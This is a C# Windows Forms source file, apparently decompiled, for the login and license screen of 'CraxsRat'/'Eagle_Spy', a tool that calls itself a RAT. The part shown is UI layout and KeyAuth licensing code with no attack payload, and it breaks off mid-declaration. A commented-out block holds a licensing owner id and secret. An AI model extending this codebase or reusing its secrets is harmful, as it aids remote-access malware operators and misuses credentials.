using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Eagle_Spy.My;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ListView;
using System.Security.Cryptography;
using System.Collections.Specialized;
using System.Text;
using System.Net;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Diagnostics;
using System.Security.Principal;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Windows;
using System.Threading;
using System.Runtime.CompilerServices;
using Eaglespy;
using Eagle_Spy;

namespace Eagle_Spy;

[DesignerGenerated]
public class Ports : Form

{

    //public static api KeyAuthApp = new api(
    //name: "CraxsRat",
    //ownerid: "IJoPRCSjQ0",
    // secret: "555e56348f074d896570918dc73b863135b5c2ecadcab6539df539dfe3701e4c",
    //version: "1.0"
    //);

    private void ShowResponse(string type)
    {
        //responseTimeLbl.Text = $"It took {api.responseTime} ms to {type}"; // you need to create a label called responseTimeLbl to display to a label.
        //CraxsAlert.Showinformation($"It took {api.responseTime} msg to {type}");
        ///  MessageBox.Show($"It took {api.responseTime} msg to {type}");
    }
    public delegate void addLogback(object[] objs);

	public delegate void opebbtndele(object[] objs);

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_114_FadeIn : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal Form _0024VB_0024Local_o;

		internal int _0024VB_0024Local_interval;

		internal Ports _0024VB_0024Me;

		internal Form _0024S0;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if (num != 0)
					goto IL_0028;
				num = -1;
				_0024State = -1;
				TaskAwaiter awaiter = _0024A0;
				_0024A0 = default(TaskAwaiter);
				goto IL_005d;
				IL_0028:
				if (_0024VB_0024Local_o.Opacity < 1.0)
				{
					awaiter = Task.Delay(_0024VB_0024Local_interval).GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = 0;
						_0024State = 0;
						_0024A0 = awaiter;
						ref AsyncVoidMethodBuilder reference = ref _0024Builder;
						VB_0024StateMachine_114_FadeIn stateMachine = this;
						reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
						return;
					}
					goto IL_005d;
				}
				_0024VB_0024Local_o.Opacity = 1.0;
				_0024VB_0024Me.Timer1.Start();
				_0024VB_0024Me.Login.Select();
				_0024VB_0024Me.Login.Enabled = true;
				goto end_IL_0007;
				IL_005d:
				awaiter.GetResult();
				awaiter = default(TaskAwaiter);
				(_0024S0 = _0024VB_0024Local_o).Opacity = _0024S0.Opacity + 0.05;
				goto IL_0028;
				end_IL_0007:;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception = ex;
				_0024State = -2;
				_0024Builder.SetException(exception);
                //////CraxsAlert.Showinformation("Sorry");
                return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pnl1")]
	private Panel _pnl1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("loginbtn")]
	private DrakeUIButtonIcon _loginbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("policylink")]
	private DrakeUILinkLabel _policylink;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("usrkeytext")]
	private DrakeUITextBox _usrkeytext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statuslabel")]
	private Label _statuslabel;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("changeidlabel")]
	private DrakeUILinkLabel _changeidlabel;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("qutelabel")]
	private Label _qutelabel;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("exitbtn")]
	private DrakeUIButtonIcon _exitbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUILinkLabel1")]
	private DrakeUILinkLabel _DrakeUILinkLabel1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("loginworker")]
	private BackgroundWorker _loginworker;

	private Random r;

	public string Ping_Json;

	public string Check_Json;

	public string Checkv2_Json;

	public string Session;

	public string IDC_Json;

	public string Secritkey;

	private string holder;

	private int index;

	public bool Finish;

	public bool S;

	[field: AccessedThroughProperty("notpass")]
	internal NotifyIcon notpass;









    [field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal DrakeUIToolTip DrakeUIToolTip1
    ;

    [field: AccessedThroughProperty("ToolTip1")]
	//internal ToolTip ToolTip1
   

	internal System.Windows.Forms.Timer Timer1
	;
    internal PictureBox PictureBox2;
    internal Guna.UI2.WinForms.Guna2PictureBox Guna2PictureBox1;
    internal DrakeUILabel DrakeUILabel1;
    internal Guna.UI2.WinForms.Guna2TextBox KeyAuthPass;
    internal Guna.UI2.WinForms.Guna2TextBox KeyAuthUser;
    internal DrakeUILabel DrakeUILabel2;
    internal Sipaa.Framework.SPanel SPanel1;
    internal Guna.UI2.WinForms.Guna2TextBox KeyAuthKey;
    internal Guna.UI2.WinForms.Guna2BorderlessForm Guna2BorderlessForm1;
    internal Guna.UI2.WinForms.Guna2GradientButton Login;
   // internal TextBox passtxt;
    internal NotifyIcon notifyIcon1;
    internal System.Windows.Forms.Timer TOpacity;
    private Panel panel1;
    internal Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox2;
    internal DrakeUILabel drakeUILabel3;
    internal Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton4;
    internal Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton3;
    internal Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton2;
    internal Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton1;
    private CheckBox checkBox1;
    private Label label1;
    internal DrakeUILabel drakeUILabel4;
    internal BackgroundWorker loginworker
	;

    [DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.notpass = new System.Windows.Forms.NotifyIcon(this.components);
            this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.Timer1 = new System.Windows.Forms.Timer(this.components);
            this.loginworker = new System.ComponentModel.BackgroundWorker();
            this.DrakeUILabel1 = new DrakeUI.Framework.DrakeUILabel();
            this.KeyAuthPass = new Guna.UI2.WinForms.Guna2TextBox();
            this.KeyAuthUser = new Guna.UI2.WinForms.Guna2TextBox();
            this.DrakeUILabel2 = new DrakeUI.Framework.DrakeUILabel();
            this.SPanel1 = new Sipaa.Framework.SPanel();
            this.KeyAuthKey = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            this.Login = new Guna.UI2.WinForms.Guna2GradientButton();
            this.panel1 = new System.Windows.Forms.Panel();
            this.guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.drakeUILabel3 = new DrakeUI.Framework.DrakeUILabel();
            this.guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.label1 = new System.Windows.Forms.Label();
            this.drakeUILabel4 = new DrakeUI.Framework.DrakeUILabel();
            this.PictureBox2 = new System.Windows.Forms.PictureBox();
            this.Guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // notpass
            // 
            this.notpass.Text = "NotifyIcon1";
            this.notpass.Visible = true;
            // 
            // DrakeUIToolTip1
            // 
            this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(239)))), ((int)(((byte)(239)))));
            this.DrakeUIToolTip1.OwnerDraw = true;
            // 
            // loginworker
            // 
            this.loginworker.DoWork += new System.ComponentModel.DoWorkEventHandler(this.Loginworker_DoWork);
            // 
            // DrakeUILabel1
            // 
            this.DrakeUILabel1.Font = new System.Drawing.Font("Bahnschrift Light", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUILabel1.ForeColor = System.Drawing.Color.Gray;
            this.DrakeUILabel1.Location = new System.Drawing.Point(69, 158);
            this.DrakeUILabel1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.DrakeUILabel1.Name = "DrakeUILabel1";
            this.DrakeUILabel1.Size = new System.Drawing.Size(363, 38);
            this.DrakeUILabel1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUILabel1.TabIndex = 57;
            this.DrakeUILabel1.Text = "\" One Rat To Rule Them All \"";
            this.DrakeUILabel1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // KeyAuthPass
            // 
            this.KeyAuthPass.BorderColor = System.Drawing.Color.Red;
            this.KeyAuthPass.BorderRadius = 4;
            this.KeyAuthPass.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.KeyAuthPass.DefaultText = "";
            this.KeyAuthPass.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.KeyAuthPass.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.KeyAuthPass.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.KeyAuthPass.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.KeyAuthPass.FillColor = System.Drawing.Color.Black;
            this.KeyAuthPass.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.KeyAuthPass.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold);
            this.KeyAuthPass.ForeColor = System.Drawing.Color.Red;
            this.KeyAuthPass.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.KeyAuthPass.Location = new System.Drawing.Point(7, 404);
            this.KeyAuthPass.Margin = new System.Windows.Forms.Padding(7, 5, 7, 5);
            this.KeyAuthPass.Name = "KeyAuthPass";
            this.KeyAuthPass.PasswordChar = '\0';
            this.KeyAuthPass.PlaceholderForeColor = System.Drawing.Color.Red;
            this.KeyAuthPass.PlaceholderText = "Password";
            this.KeyAuthPass.SelectedText = "";
            this.KeyAuthPass.Size = new System.Drawing.Size(489, 44);
            this.KeyAuthPass.TabIndex = 55;
            this.KeyAuthPass.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // KeyAuthUser
            // 
            this.KeyAuthUser.BorderColor = System.Drawing.Color.Red;
            this.KeyAuthUser.BorderRadius = 4;
            this.KeyAuthUser.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.KeyAuthUser.DefaultText = "";
            this.KeyAuthUser.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.KeyAuthUser.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.KeyAuthUser.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.KeyAuthUser.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.KeyAuthUser.FillColor = System.Drawing.Color.Black;
            this.KeyAuthUser.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.KeyAuthUser.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold);
            this.KeyAuthUser.ForeColor = System.Drawing.Color.Red;
            this.KeyAuthUser.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.KeyAuthUser.Location = new System.Drawing.Point(7, 348);
            this.KeyAuthUser.Margin = new System.Windows.Forms.Padding(7, 5, 7, 5);
            this.KeyAuthUser.Name = "KeyAuthUser";
            this.KeyAuthUser.PasswordChar = '\0';
            this.KeyAuthUser.PlaceholderForeColor = System.Drawing.Color.Red;
            this.KeyAuthUser.PlaceholderText = "Email/Username";
            this.KeyAuthUser.SelectedText = "";
            this.KeyAuthUser.Size = new System.Drawing.Size(489, 44);
            this.KeyAuthUser.TabIndex = 54;
            this.KeyAuthUser.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // DrakeUILabel2
            // 
            this.DrakeUILabel2.Font = new System.Drawing.Font("Bahnschrift", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUILabel2.ForeColor = System.Drawing.Color.Red;
            this.DrakeUILabel2.Location = new System.Drawing.Point(52, 90);
            this.DrakeUILabel2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.DrakeUILabel2.Name = "DrakeUILabel2";
            this.DrakeUILabel2.Size = new System.Drawing.Size(424, 84);
            this.DrakeUILabel2.TabIndex = 71;
            this.DrakeUILabel2.Text = "Welcome To CraxsRat";
            this.DrakeUILabel2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // SPanel1
            // 
            this.SPanel1.BackColor = System.Drawing.Color.Black;
            this.SPanel1.BorderColor = System.Drawing.Color.Black;
            this.SPanel1.BorderRadius = 6;
            this.SPanel1.BorderSize = 0;
            this.SPanel1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(189)))), ((int)(((byte)(66)))));
            this.SPanel1.Location = new System.Drawing.Point(1504, 113);
            this.SPanel1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.SPanel1.Name = "SPanel1";
            this.SPanel1.Size = new System.Drawing.Size(147, 311);
            this.SPanel1.TabIndex = 66;
            // 
            // KeyAuthKey
            // 
            this.KeyAuthKey.BorderColor = System.Drawing.Color.Red;
            this.KeyAuthKey.BorderRadius = 4;
            this.KeyAuthKey.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.KeyAuthKey.DefaultText = "";
            this.KeyAuthKey.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.KeyAuthKey.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.KeyAuthKey.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.KeyAuthKey.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.KeyAuthKey.FillColor = System.Drawing.Color.Black;
            this.KeyAuthKey.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.KeyAuthKey.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.KeyAuthKey.ForeColor = System.Drawing.Color.Red;
            this.KeyAuthKey.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.KeyAuthKey.Location = new System.Drawing.Point(91, 822);
            this.KeyAuthKey.Margin = new System.Windows.Forms.Padding(7, 5, 7, 5);
            this.KeyAuthKey.Name = "KeyAuthKey";
            this.KeyAuthKey.PasswordChar = '*';
            this.KeyAuthKey.PlaceholderForeColor = System.Drawing.Color.Red;
            this.KeyAuthKey.PlaceholderText = "Key";
            this.KeyAuthKey.SelectedText = "";
            this.KeyAuthKey.Size = new System.Drawing.Size(267, 26);
            this.KeyAuthKey.TabIndex = 53;
            this.KeyAuthKey.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // Guna2BorderlessForm1
            // 
            this.Guna2BorderlessForm1.ContainerControl = this;
            this.Guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6D;
            this.Guna2BorderlessForm1.TransparentWhileDrag = true;
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.Text = "NotifyIcon1";
            this.notifyIcon1.Visible = true;
            // 
            // TOpacity
            // 
            this.TOpacity.Interval = 1;
            // 
            // Login
            // 
            this.Login.Animated = true;
            this.Login.BorderColor = System.Drawing.Color.Red;
            this.Login.BorderRadius = 4;
            this.Login.BorderThickness = 2;
            this.Login.CheckedState.FillColor = System.Drawing.Color.Red;
            this.Login.CheckedState.FillColor2 = System.Drawing.Color.Red;
            this.Login.DisabledState.BorderColor = System.Drawing.Color.Red;
            this.Login.DisabledState.CustomBorderColor = System.Drawing.Color.Red;
            this.Login.DisabledState.FillColor = System.Drawing.Color.Red;
            this.Login.DisabledState.FillColor2 = System.Drawing.Color.Red;
            this.Login.DisabledState.ForeColor = System.Drawing.Color.White;
            this.Login.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.Login.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.Login.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Login.ForeColor = System.Drawing.Color.Red;
            this.Login.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.BackwardDiagonal;
            this.Login.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.Login.Location = new System.Drawing.Point(147, 491);
            this.Login.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Login.Name = "Login";
            this.Login.Size = new System.Drawing.Size(196, 38);
            this.Login.TabIndex = 63;
            this.Login.Text = "login";
            this.Login.Click += new System.EventHandler(this.Login_Click);
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.panel1.Controls.Add(this.guna2GradientButton3);
            this.panel1.Controls.Add(this.guna2GradientButton2);
            this.panel1.Controls.Add(this.guna2GradientButton1);
            this.panel1.Controls.Add(this.checkBox1);
            this.panel1.Controls.Add(this.guna2PictureBox2);
            this.panel1.Controls.Add(this.drakeUILabel3);
            this.panel1.Controls.Add(this.KeyAuthKey);
            this.panel1.Controls.Add(this.DrakeUILabel1);
            this.panel1.Controls.Add(this.KeyAuthUser);
            this.panel1.Controls.Add(this.KeyAuthPass);
            this.panel1.Controls.Add(this.DrakeUILabel2);
            this.panel1.Controls.Add(this.Login);
            this.panel1.Location = new System.Drawing.Point(3, 2);
            this.panel1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(503, 724);
            this.panel1.TabIndex = 73;
            // 
            // guna2GradientButton3
            // 
            this.guna2GradientButton3.Animated = true;
            this.guna2GradientButton3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.guna2GradientButton3.BorderRadius = 4;
            this.guna2GradientButton3.BorderThickness = 2;
            this.guna2GradientButton3.CheckedState.FillColor = System.Drawing.Color.Red;
            this.guna2GradientButton3.CheckedState.FillColor2 = System.Drawing.Color.Red;
            this.guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.Red;
            this.guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.Red;
            this.guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.guna2GradientButton3.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.guna2GradientButton3.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2GradientButton3.ForeColor = System.Drawing.Color.DeepSkyBlue;
            this.guna2GradientButton3.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.BackwardDiagonal;
            this.guna2GradientButton3.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.guna2GradientButton3.Location = new System.Drawing.Point(147, 625);
            this.guna2GradientButton3.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.guna2GradientButton3.Name = "guna2GradientButton3";
            this.guna2GradientButton3.Size = new System.Drawing.Size(196, 38);
            this.guna2GradientButton3.TabIndex = 78;
            this.guna2GradientButton3.Text = "Tutorials";
            // 
            // guna2GradientButton2
            // 
            this.guna2GradientButton2.Animated = true;
            this.guna2GradientButton2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.guna2GradientButton2.BorderRadius = 4;
            this.guna2GradientButton2.BorderThickness = 2;
            this.guna2GradientButton2.CheckedState.FillColor = System.Drawing.Color.Red;
            this.guna2GradientButton2.CheckedState.FillColor2 = System.Drawing.Color.Red;
            this.guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.Red;
            this.guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.Red;
            this.guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.guna2GradientButton2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2GradientButton2.ForeColor = System.Drawing.Color.DeepSkyBlue;
            this.guna2GradientButton2.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.BackwardDiagonal;
            this.guna2GradientButton2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.guna2GradientButton2.Location = new System.Drawing.Point(75, 672);
            this.guna2GradientButton2.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.guna2GradientButton2.Name = "guna2GradientButton2";
            this.guna2GradientButton2.Size = new System.Drawing.Size(328, 38);
            this.guna2GradientButton2.TabIndex = 77;
            this.guna2GradientButton2.Text = "I Agree To Terms Of Service";
            // 
            // guna2GradientButton1
            // 
            this.guna2GradientButton1.Animated = true;
            this.guna2GradientButton1.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton1.BorderRadius = 4;
            this.guna2GradientButton1.BorderThickness = 2;
            this.guna2GradientButton1.CheckedState.FillColor = System.Drawing.Color.Red;
            this.guna2GradientButton1.CheckedState.FillColor2 = System.Drawing.Color.Red;
            this.guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.Red;
            this.guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.Red;
            this.guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(18)))), ((int)(((byte)(11)))), ((int)(((byte)(13)))));
            this.guna2GradientButton1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2GradientButton1.ForeColor = System.Drawing.Color.Red;
            this.guna2GradientButton1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.BackwardDiagonal;
            this.guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.guna2GradientButton1.Location = new System.Drawing.Point(1436, 748);
            this.guna2GradientButton1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.guna2GradientButton1.Name = "guna2GradientButton1";
            this.guna2GradientButton1.Size = new System.Drawing.Size(196, 38);
            this.guna2GradientButton1.TabIndex = 76;
            this.guna2GradientButton1.Text = "Tutorials";
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
            this.checkBox1.Location = new System.Drawing.Point(7, 468);
            this.checkBox1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(119, 20);
            this.checkBox1.TabIndex = 75;
            this.checkBox1.Text = "Remember me";
            this.checkBox1.UseVisualStyleBackColor = true;
            // 
            // guna2PictureBox2
            // 
            this.guna2PictureBox2.FillColor = System.Drawing.Color.Black;
            this.guna2PictureBox2.Image = global::Eagle_Spy_Applications.remo;
            this.guna2PictureBox2.ImageRotate = 0F;
            this.guna2PictureBox2.Location = new System.Drawing.Point(205, 12);
            this.guna2PictureBox2.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.guna2PictureBox2.Name = "guna2PictureBox2";
            this.guna2PictureBox2.Size = new System.Drawing.Size(77, 80);
            this.guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox2.TabIndex = 74;
            this.guna2PictureBox2.TabStop = false;
            // 
            // drakeUILabel3
            // 
            this.drakeUILabel3.Font = new System.Drawing.Font("Bahnschrift Light", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel3.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.drakeUILabel3.Location = new System.Drawing.Point(116, 286);
            this.drakeUILabel3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel3.Name = "drakeUILabel3";
            this.drakeUILabel3.Size = new System.Drawing.Size(303, 38);
